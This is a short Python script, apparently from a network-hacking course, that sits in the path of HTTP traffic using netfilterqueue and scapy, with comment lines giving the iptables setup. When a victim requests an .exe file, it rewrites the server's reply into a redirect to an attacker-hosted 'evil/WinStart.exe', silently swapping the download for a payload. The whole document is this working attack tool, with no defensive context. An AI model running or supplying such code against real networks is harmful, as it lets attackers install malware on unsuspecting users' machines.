import netfilterqueue
import scapy.all as scapy
from urllib.parse import urljoin
from scapy.layers.inet import IP, TCP

#apt-get install python-netfilterqueue
#pip install Cython --install-option="--no-cython-compile"
#apt-get install build-essential python-dev libnetfilter-queue-dev

#iptables -I FORWARD -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8000
# iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:8000
#iptables --flush

ack_list = []
port = 80
file_location = "http://10.0.2.5/evil/"
file_name = "WinStart.exe"
url = urljoin(file_location, file_name)

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[TCP].dport == port:
            #print(scapy_packet.show())
            #print("HTTP Request")
            if b".exe" in scapy_packet[scapy.Raw].load and bytes(file_name, "utf-8") not in scapy_packet[scapy.Raw].load:
                print("[+] EXE Request")
                ack_list.append(scapy_packet[TCP].ack)
                #print(scapy_packet.show())
        elif scapy_packet[TCP].sport == port:
            #print ("HTTP Response")
            if scapy_packet[TCP].seq in ack_list:
                ack_list.remove(scapy_packet[TCP].seq)
                print("[+] Replacing File")
                print(url)
                modified_packet = set_load(scapy_packet, bytes("HTTP/1.1 301 Moved Permanently\nLocation: " + url + "\n\n", "utf-8"))
                packet.set_payload(bytes(modified_packet))
                #print(scapy_packet.show())
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()